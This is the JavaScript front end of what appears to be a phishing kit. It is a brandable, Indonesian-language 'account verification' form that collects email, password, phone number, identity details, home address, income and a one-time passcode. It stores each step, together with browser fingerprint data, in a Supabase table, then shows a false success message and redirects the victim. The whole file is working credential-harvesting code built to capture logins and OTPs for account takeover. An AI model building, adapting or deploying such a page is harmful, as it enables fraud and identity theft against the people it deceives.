(function () {
  'use strict';

  const C = window.CONFIG || {};
  const sb = supabase.createClient(C.SUPABASE_URL, C.SUPABASE_ANON_KEY);

  const main = document.getElementById('main');
  const bar = document.getElementById('bar');
  const stepInfo = document.getElementById('stepInfo');

  document.getElementById('brandName').textContent = C.BRAND || 'SecureID';
  document.getElementById('brandSub').textContent = C.BRAND_SUB || '';
  document.getElementById('mark').textContent = C.MARK || 'S';
  document.getElementById('footBrand').textContent = C.BRAND || 'SecureID';

  const state = {};
  const sessionId = crypto.randomUUID();
  let rowId = null;
  let index = 0;

  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
  const PHONE_RE = /^(\+?62|0)8[0-9]{7,12}$/;

  const STEPS = [
    {
      title: 'Masuk ke akun Anda',
      desc: 'Gunakan email dan nomor HP yang terdaftar.',
      cta: 'Lanjut',
      fields: [
        { name: 'email', label: 'Email', type: 'email', required: true, pattern: EMAIL_RE, err: 'Format email tidak valid' },
        { name: 'password', label: 'Kata sandi', type: 'password', required: true, err: 'Kata sandi wajib diisi' },
        { name: 'phone', label: 'Nomor HP', type: 'tel', inputmode: 'numeric', required: true, pattern: PHONE_RE, err: 'Nomor HP tidak valid', hint: 'Contoh: 081234567890' }
      ]
    },
    {
      title: 'Data diri',
      desc: 'Lengkapi sesuai kartu identitas Anda.',
      cta: 'Lanjut',
      fields: [
        { name: 'full_name', label: 'Nama lengkap', type: 'text', required: true, err: 'Nama wajib diisi' },
        { name: 'age', label: 'Umur', type: 'number', inputmode: 'numeric', required: true, min: 10, max: 100, err: 'Umur tidak valid' },
        { name: 'birth_date', label: 'Tanggal lahir', type: 'date', required: true, err: 'Tanggal lahir wajib diisi' },
        {
          name: 'gender', label: 'Jenis kelamin', type: 'select', required: true, err: 'Pilih salah satu',
          options: ['Laki-laki', 'Perempuan']
        }
      ]
    },
    {
      title: 'Alamat tinggal',
      desc: 'Alamat sesuai domisili saat ini.',
      cta: 'Lanjut',
      fields: [
        { name: 'address', label: 'Alamat lengkap', type: 'textarea', required: true, err: 'Alamat wajib diisi' },
        { name: 'city', label: 'Kota / kabupaten', type: 'text', required: true, err: 'Kota wajib diisi' },
        { name: 'province', label: 'Provinsi', type: 'text', required: true, err: 'Provinsi wajib diisi' },
        { name: 'postal_code', label: 'Kode pos', type: 'text', inputmode: 'numeric', required: true, pattern: /^[0-9]{5}$/, err: 'Kode pos 5 digit' }
      ]
    },
    {
      title: 'Pekerjaan & pendapatan',
      desc: 'Digunakan untuk penyesuaian limit akun.',
      cta: 'Lanjut',
      fields: [
        {
          name: 'occupation', label: 'Pekerjaan', type: 'select', required: true, err: 'Pilih salah satu',
          options: ['Pelajar / mahasiswa', 'Karyawan swasta', 'Wirausaha', 'ASN / TNI / Polri', 'Ibu rumah tangga', 'Lainnya']
        },
        {
          name: 'income', label: 'Pendapatan per bulan', type: 'select', required: true, err: 'Pilih salah satu',
          options: ['< 2 juta', '2 - 5 juta', '5 - 10 juta', '10 - 20 juta', '> 20 juta']
        }
      ]
    },
    {
      title: 'Verifikasi OTP',
      desc: 'Kode 6 digit dikirim ke nomor terdaftar.',
      cta: 'Verifikasi',
      fields: [
        {
          name: 'otp', label: 'Kode OTP', type: 'text', inputmode: 'numeric', cls: 'otp',
          required: true, pattern: /^[0-9]{6}$/, err: 'Kode harus 6 digit',
          hint: 'Tidak menerima kode? Tunggu sebentar lalu ulangi.'
        }
      ]
    }
  ];

  function progress() {
    const pct = Math.round((index / STEPS.length) * 100);
    bar.style.width = pct + '%';
    stepInfo.textContent = 'Langkah ' + Math.min(index + 1, STEPS.length) + ' dari ' + STEPS.length;
  }

  function el(tag, cls, text) {
    const n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text) n.textContent = text;
    return n;
  }

  function render() {
    progress();
    main.innerHTML = '';

    const s = STEPS[index];
    if (!s) return;

    const h1 = el('h1', null, s.title);
    const p = el('p', 'desc', s.desc);
    main.append(h1, p);

    const form = el('div');
    main.append(form);

    s.fields.forEach((f) => {
      const wrap = el('div', 'field');

      const lab = el('label', null, f.label);
      lab.setAttribute('for', 'f_' + f.name);
      wrap.append(lab);

      let input;
      if (f.type === 'select') {
        input = el('select');
        const ph = el('option', null, 'Pilih...');
        ph.value = '';
        input.append(ph);
        f.options.forEach((o) => {
          const opt = el('option', null, o);
          opt.value = o;
          input.append(opt);
        });
      } else if (f.type === 'textarea') {
        input = el('textarea');
        input.rows = 3;
        input.placeholder = 'Jalan, nomor rumah, RT/RW';
      } else {
        input = el('input');
        input.type = f.type;
        if (f.inputmode) input.inputMode = f.inputmode;
        if (f.cls) input.classList.add(f.cls);
        if (f.type === 'number') input.inputMode = 'numeric';
      }

      input.id = 'f_' + f.name;
      input.name = f.name;
      input.autocomplete = 'off';
      input.spellcheck = false;
      if (state[f.name] !== undefined && state[f.name] !== null) input.value = state[f.name];

      wrap.append(input);

      if (f.hint) wrap.append(el('div', 'hint', f.hint));
      const err = el('div', 'errMsg', f.err || 'Wajib diisi');
      wrap.append(err);

      input.addEventListener('input', () => {
        input.classList.remove('bad');
        err.classList.remove('on');
        state[f.name] = input.value;
      });

      form.append(wrap);
    });

    const cta = el('button', 'cta', s.cta);
    cta.type = 'button';
    main.append(cta);
    cta.addEventListener('click', () => submit(s, form, cta));

    if (index > 0) {
      const back = el('button', 'back', 'Kembali');
      back.type = 'button';
      back.addEventListener('click', () => {
        index--;
        render();
      });
      main.append(back);
    }
  }

  function collect(s, form) {
    let ok = true;
    s.fields.forEach((f) => {
      const input = form.querySelector('#f_' + f.name);
      const err = input.parentElement.querySelector('.errMsg');
      const val = (input.value || '').trim();
      state[f.name] = val;

      let bad = false;
      if (f.required && !val) bad = true;
      if (!bad && val && f.pattern && !f.pattern.test(val)) bad = true;
      if (!bad && val && f.type === 'number') {
        const n = Number(val);
        if (f.min !== undefined && n < f.min) bad = true;
        if (f.max !== undefined && n > f.max) bad = true;
      }

      if (bad) {
        ok = false;
        input.classList.add('bad');
        err.classList.add('on');
      }
    });
    return ok;
  }

  async function submit(s, form, cta) {
    if (!collect(s, form)) return;

    cta.disabled = true;
    cta.innerHTML = '<span class="spin"></span>Memproses...';

    const payload = { step: index + 1, updated_at: new Date().toISOString() };
    s.fields.forEach((f) => {
      payload[f.name] = state[f.name];
    });
    if (payload.age) payload.age = Number(payload.age);

    try {
      if (!rowId) {
        payload.session_id = sessionId;
        payload.user_agent = navigator.userAgent;
        payload.referrer = document.referrer || '';
        payload.page_url = location.href;
        payload.screen = screen.width + 'x' + screen.height;
        payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const { data, error } = await sb.from('submissions').insert(payload).select('id').single();
        if (error) throw error;
        rowId = data.id;
      } else {
        const { error } = await sb.from('submissions').update(payload).eq('id', rowId);
        if (error) throw error;
      }
    } catch (e) {
      console.error(e);
      cta.disabled = false;
      cta.textContent = s.cta;
      showAlert(form, 'Koneksi bermasalah. Coba tekan tombol sekali lagi.');
      return;
    }

    index++;

    if (index >= STEPS.length) {
      finish();
    } else {
      render();
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }

  function showAlert(container, msg) {
    const old = main.querySelector('.alert');
    if (old) old.remove();
    const a = el('div', 'alert', msg);
    container.prepend(a);
  }

  function finish() {
    bar.style.width = '100%';
    stepInfo.textContent = 'Selesai';
    main.innerHTML =
      '<div class="done">' +
        '<div class="tick">&#10003;</div>' +
        '<h1>Verifikasi berhasil</h1>' +
        '<p>Akun Anda sedang dialihkan. Mohon tunggu sebentar...</p>' +
      '</div>';

    const target = C.REDIRECT_URL;
    const delay = Number(C.REDIRECT_DELAY) || 2500;
    if (target) {
      setTimeout(() => {
        location.href = target;
      }, delay);
    }
  }

  render();
})();